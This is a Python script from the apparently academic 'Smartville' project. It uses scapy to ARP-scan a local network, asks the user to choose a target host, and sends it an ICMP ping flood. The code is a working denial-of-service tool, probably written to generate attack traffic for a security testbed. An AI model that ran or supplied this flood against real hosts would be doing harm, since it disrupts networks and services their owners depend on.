# This file is part of the "Smartville" project.
# Copyright (c) 2024 University of Insubria
# Licensed under the Apache License 2.0.
# SPDX-License-Identifier: Apache-2.0
# For the full text of the license, visit:
# https://www.apache.org/licenses/LICENSE-2.0

# Smartville is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# Apache License 2.0 for more details.

# You should have received a copy of the Apache License 2.0
# along with Smartville. If not, see <https://www.apache.org/licenses/LICENSE-2.0>.

# Additional licensing information for third-party dependencies
# used in this file can be found in the accompanying `NOTICE` file.
from scapy.all import ARP, Ether, srp, ICMP, send, IP

def scan_network(target_ip):
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    active_ips = []
    for idx, (_, received) in enumerate(result, start=1):
        ip = received.psrc
        active_ips.append(ip)
        print(f"{idx}. {ip}")
    return active_ips

def ping_flood(target_ip,number,delay):
    try:
        number = int(number)
        delay = float(delay)
        packet = IP(dst=target_ip)/ICMP()
        print(f"Sending {number} packets with a delay of {delay} seconds to {target_ip}")
        send(packet, count=number, inter=delay, verbose=1)
    except ValueError:
        print("Please enter valid numbers for the count and delay.")

# Example usage
if __name__ == "__main__":
    network = "192.168.1.0/24"  # Specify your network
    target_ips = scan_network(network)
    print("Active IP addresses in the network:")
    
    for idx, ip in enumerate(target_ips, start=1):
        print(f"{idx}. {ip}")

    if len(target_ips) > 0:
        choice = input("Select the IP address to attack (enter the corresponding number): ")
        try:
            choice_idx = int(choice)
            if 1 <= choice_idx <= len(target_ips):
                chosen_ip = target_ips[choice_idx - 1]
                print("Ping flood attack to:", chosen_ip)
                chosen_number = input("Number of packets to send? ")
                chosen_delay = input("Delay between packets in seconds? ")
            
                ping_flood(chosen_ip,chosen_number,chosen_delay)
            else:
                print("Invalid choice.")
        except ValueError:
            print("Please enter a valid number.")
    else:
        print("No active IP addresses found.")
        chosen_ip = input("Insert target IP manually: ")
        print("Ping flood attack to:", chosen_ip)
        chosen_number = input("Number of packets to send? ")
        chosen_delay = input("Delay between packets in seconds? ")
        ping_flood(chosen_ip,chosen_number,chosen_delay)
